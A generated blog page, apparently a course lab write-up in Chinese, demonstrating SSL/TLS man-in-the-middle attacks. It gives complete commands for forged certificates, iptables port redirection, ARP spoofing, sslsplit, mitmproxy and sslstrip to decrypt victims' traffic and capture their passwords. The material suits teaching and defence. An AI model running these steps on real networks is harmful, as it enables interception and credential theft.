@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SSL中间人攻击 | Hexo</title><meta name="keywords" content="数据嗅探"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="任务104：SSL、TLS中间人攻击 下面是攻击原理 开 始 实 验下面开始演示 1.先利用openssl先生成伪造证书 生成证书 需要两步  先利用openssl生成一个证书的私钥 1openssl genrsa -out ca.key 2048   		 后面2048位是长度还有4096位        生成出来的文件 1.2. 在用上面私钥生成证书 1openssl req -new -x5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSL中间人攻击">
+<meta property="og:url" content="http://example.com/2020/03/10/SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="任务104：SSL、TLS中间人攻击 下面是攻击原理 开 始 实 验下面开始演示 1.先利用openssl先生成伪造证书 生成证书 需要两步  先利用openssl生成一个证书的私钥 1openssl genrsa -out ca.key 2048   		 后面2048位是长度还有4096位        生成出来的文件 1.2. 在用上面私钥生成证书 1openssl req -new -x5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://pic.netbian.com/uploads/allimg/200313/235000-1584114600db79.jpg">
+<meta property="article:published_time" content="2020-03-10T02:38:30.000Z">
+<meta property="article:modified_time" content="2021-05-01T23:57:08.327Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="数据嗅探">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pic.netbian.com/uploads/allimg/200313/235000-1584114600db79.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/03/10/SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSL中间人攻击',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-02 07:57:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">143</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">59</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://pic.netbian.com/uploads/allimg/200313/235000-1584114600db79.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSL中间人攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-10T02:38:30.000Z" title="发表于 2020-03-10 10:38:30">2020-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-01T23:57:08.327Z" title="更新于 2021-05-02 07:57:08">2021-05-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%97%85%E6%8E%A2/">数据嗅探</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSL中间人攻击"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>任务104：SSL、TLS中间人攻击</p>
+<p><strong>下面是攻击原理</strong><br><img src="https://img-blog.csdnimg.cn/20200115173502239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
+<h2 id="开-始-实-验"><a href="#开-始-实-验" class="headerlink" title="开 始 实 验"></a>开 始 实 验</h2><p>下面开始演示</p>
+<h2 id="1-先利用openssl先生成伪造证书"><a href="#1-先利用openssl先生成伪造证书" class="headerlink" title="1.先利用openssl先生成伪造证书"></a>1.先利用openssl先生成伪造证书</h2><ol>
+<li>生成证书 需要两步</li>
+</ol>
+<p><strong>先利用openssl生成一个证书的私钥</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048   		</span><br></pre></td></tr></table></figure>
+<p>后面2048位是长度还有4096位<br>    <img src="https://img-blog.csdnimg.cn/20200115173857404.png" alt="在这里插入图片描述"><br>    生成出来的文件<br><img src="https://img-blog.csdnimg.cn/20200115173926356.png" alt="在这里插入图片描述"></p>
+<p><strong>1.2. 在用上面私钥生成证书</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 200 -key ca.key -out ca.crt	</span><br></pre></td></tr></table></figure>
+<p><strong>-x509</strong>是证书格式        <strong>200</strong>是天这个证书有效时间  <strong>ca.key</strong>是要用到的私钥这个密钥就是上面生成出来的       <strong>ca.crt</strong>生成的证书<br><strong>需要叫你填写</strong><br><img src="https://img-blog.csdnimg.cn/2020011517453038.png" alt="在这里插入图片描述"></p>
+<h2 id="2-启动路由功能"><a href="#2-启动路由功能" class="headerlink" title="2.启动路由功能"></a>2.启动路由功能</h2><ol start="2">
+<li>启动后他会将客户端发来的数据包的地址进行转发，可以当作一个路由器使用不然ARP欺骗后客户端就不能利用我的电脑访问服务器了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>上面意思是叫这个net.ipv4.ip_forward参数设置成1</strong></p>
+<h2 id="3-用Iptables端口转发规则和sslscan工具进行中间人攻击"><a href="#3-用Iptables端口转发规则和sslscan工具进行中间人攻击" class="headerlink" title="3. 用Iptables端口转发规则和sslscan工具进行中间人攻击"></a>3. 用Iptables端口转发规则和sslscan工具进行中间人攻击</h2><ol start="3">
+<li></li>
+</ol>
+<p><strong>为什么要端口转发那？，就是叫80和443端口还有好多加密的端口收到的包，全部都转发到另外一个端口上，这个端口就是伪造证书解密类型的工具上</strong></p>
+<p><strong>3.1.空表和查看表有没有配置好的表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L </span><br></pre></td></tr></table></figure>
+<p><strong>-t是指定表  -L是查看 意思就是nat 表有没有端口转发规则</strong><br><img src="https://img-blog.csdnimg.cn/20200115175800987.png" alt="在这里插入图片描述"><br><strong>3.2.清空表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br></pre></td></tr></table></figure>
+
+<p><strong>-t是指定表 -F 是清空表意思就是清空nat表</strong></p>
+<p>3.3. 端口转发规则配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443	 #这个是https</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443	 #这个是MSA</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 	#这个是SMTPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443	 #这个是IMAPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443	 #这个是POP3S</span><br></pre></td></tr></table></figure>
+<p>上面意思是<br>-t 是使用的那个表<br>-A PREROUTING 是路由之前就生效的<br>-t    tcl  –dport 80     -j REDIRECT –to-ports 8080 就是客户端发给我的是tcl协议去往80端口都会重定向给8080<br>里面为什么有8443应为sslscan工具可以进行多个端口  ，还有可以解密多个协议MSA，SMTP，SIMAPS，POP3S</p>
+<p>可以查看一下用上面的命令<code>iptables -t nat -L</code><br><img src="https://img-blog.csdnimg.cn/20200115184701512.png" alt="在这里插入图片描述"><br><strong>3.4. ARP欺骗</strong><br>应为需要叫目标请求发送给我</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标的ip -r 网关</span><br></pre></td></tr></table></figure>
+<p><strong>3.5.</strong> <strong>使用sslscan进行SSL中间人攻击</strong><br>先创建一个文件夹<br>mkdir -p test/logdir<br><strong>启动sslscan</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/test -S /root/test/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
+<p><strong>上面命令的意思</strong><br><strong>-D</strong>    就是查看详细信息<br><strong>-l  connect.log</strong> 连接信息都会记录到connect.log文件里<br><strong>-j  /root/test</strong>         跟目录<br><strong>-s   /root/test/logdir/</strong>          请求都在这个logdir/目录里面<br><strong>-k ca.key</strong>            指定私钥ca.key文件（上面生成出来的）<br><strong>-c ca.crt</strong>            指定证书ca.crt    文件（上面生成出来的）<br><strong>ssl 0.0.0.0 8443</strong> 加密的请求在8443端口侦听<br><strong>tcp 0.0.0.0 8080</strong> 不加密的请求在8080端口监听<br>运行上面命令就启动了<img src="https://img-blog.csdnimg.cn/20200115194010700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br><strong>被攻击的电脑访问网络就会出现这个情况</strong><br><strong>在目标访问https的网站就会出现证书错误这个还是有可能是中间攻击的特征</strong><br><img src="https://img-blog.csdnimg.cn/202001152004531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>被攻击端电脑可以看见证书不一样<br><img src="https://img-blog.csdnimg.cn/20200115202352957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在浏览器登录账号密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200115201241173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标所有的请求和访问在保存在 /root/test/logdir/ 里<br><img src="https://img-blog.csdnimg.cn/20200115201923746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>看一下文件内容可以看见请求内容已经被解密了<br>应为网站安全有的密码被也被加密组件进行加密了还是看不到密码</strong><br><img src="https://img-blog.csdnimg.cn/20200115202109649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="其他工具实现SSL中间人攻击"><a href="#其他工具实现SSL中间人攻击" class="headerlink" title="其他工具实现SSL中间人攻击"></a>其他工具实现SSL中间人攻击</h2><ol>
+<li>Mitmproxy工具使用<br>和sslscan工具是以类的工具<br>他支持8080侦听<br>使用Iptables端口转发规则只能转发到8080上了<br>查看有没有配置好的命令<code>iptables -t nat -L</code><br>清除配置的<code>iptables -t nat -F</code>这两个上面已说了</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080	 #这个是https</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>启动Mitmproxy</li>
+</ol>
+<p>mitmproxy -T –host -w mitmproxy.log</p>
+<ol start="2">
+<li>sslstrip工具使用进行SSL中间人攻击<br> 我们访问https网站的时候就算你不加上https的话服务器也会给你强制加上httos<br><img src="https://img-blog.csdnimg.cn/2020011520583627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+</ol>
+<p>黑客在发送给服务器sslstrip工具就给他还换成https的请求了</p>
+<p>还是要指定端口</p>
+<p>应为这个工具也是只能监听一个端口<br>查看清除配置就不说了上面有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080		#这个是http</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080	 #这个是https</span><br></pre></td></tr></table></figure>
+<p><strong>启动sslstrip工具</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure>
+<p>-l    是指定监听的端口<br><img src="https://img-blog.csdnimg.cn/20200115210307478.png" alt="在这里插入图片描述"></p>
+<p>目标电脑访问https网站的就会变成了http的了<br><img src="https://img-blog.csdnimg.cn/20200115210551120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标电脑登陆账号密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200115211230450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>然后黑客我就可以进行查看你请求的信息和账号密码了</strong><br><strong>网站比较安全的还要用组件进行密码的加密有的密码可能还是被加密了这个是属于正常情况</strong><br><img src="https://img-blog.csdnimg.cn/20200115211623557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/03/10/SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">http://example.com/2020/03/10/SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%97%85%E6%8E%A2/">数据嗅探</a></div><div class="post_share"><div class="social-share" data-image="http://pic.netbian.com/uploads/allimg/200313/235000-1584114600db79.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/03/31/ms/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210411075341091.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">1.木马病毒和免杀技术</div></div></a></div><div class="next-post pull-right"><a href="/2020/01/20/http%E5%8D%8F%E8%AE%AE/"><img class="next-cover" src="https://www.outsourcesem.com/blog/img/http%20vs%20https/http-vs-https.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">http协议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/04/21/抓微信小程序数据/" title="抓微信小程序数据"><img class="cover" src="https://pic.3gbizhi.com/2019/1124/thumb_1680_0_20191124050326445.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-21</div><div class="title">抓微信小程序数据</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80-%E5%A7%8B-%E5%AE%9E-%E9%AA%8C"><span class="toc-number">1.</span> <span class="toc-text">开 始 实 验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%88%E5%88%A9%E7%94%A8openssl%E5%85%88%E7%94%9F%E6%88%90%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6"><span class="toc-number">2.</span> <span class="toc-text">1.先利用openssl先生成伪造证书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%8A%9F%E8%83%BD"><span class="toc-number">3.</span> <span class="toc-text">2.启动路由功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%94%A8Iptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99%E5%92%8Csslscan%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">3. 用Iptables端口转发规则和sslscan工具进行中间人攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">其他工具实现SSL中间人攻击</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
